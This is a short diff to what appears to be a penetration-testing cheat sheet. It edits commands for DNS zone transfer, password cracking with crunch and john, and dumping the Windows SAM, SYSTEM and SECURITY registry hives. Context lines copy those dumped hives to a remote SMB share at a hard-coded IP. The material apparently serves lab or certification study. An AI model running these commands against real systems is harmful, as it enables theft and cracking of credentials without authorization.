@@ -195,6 +195,9 @@ dnsrecon -a -s -b -y -k -w -d domain.tld
 
 # fierce does a more abbreviated full-enumeration (good for preliminary look)
 fierce --domain domain.tld
+
+# dig zone xfer
+dig @ns1.domain.tld -t axfr domain.tld
 ```
 
 **Common record types**:
@@ -662,7 +665,7 @@ john --wordlist=/mnt/vm-share/rockyou.txt unshadowed
 john --loopback --format=nt ntlm.hashes
 
 # feed custom wordlist via stdin
-crunch 7 7 @@@@@@@ | john --stdin hashes
+crunch 7 7 -t @@@@@@@ | john --stdin hashes
 # can also use "--pipe" to bulk read and allow rules
 
 # resume last cracking session that was stopped mid-way
@@ -2088,9 +2091,9 @@ reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
 
 ```bat
 :: Grab them from the registry
-reg save hklm\sam .\sam.save
-reg save hklm\system .\system.save
-reg save hklm\security .\security.save
+reg save hklm\sam .\sam.save /y
+reg save hklm\system .\system.save /y
+reg save hklm\security .\security.save /y
 copy .\sam.save \\192.168.119.144\share\sam.save
 copy .\system.save \\192.168.119.144\share\system.save
 copy .\security.save \\192.168.119.144\share\security.save
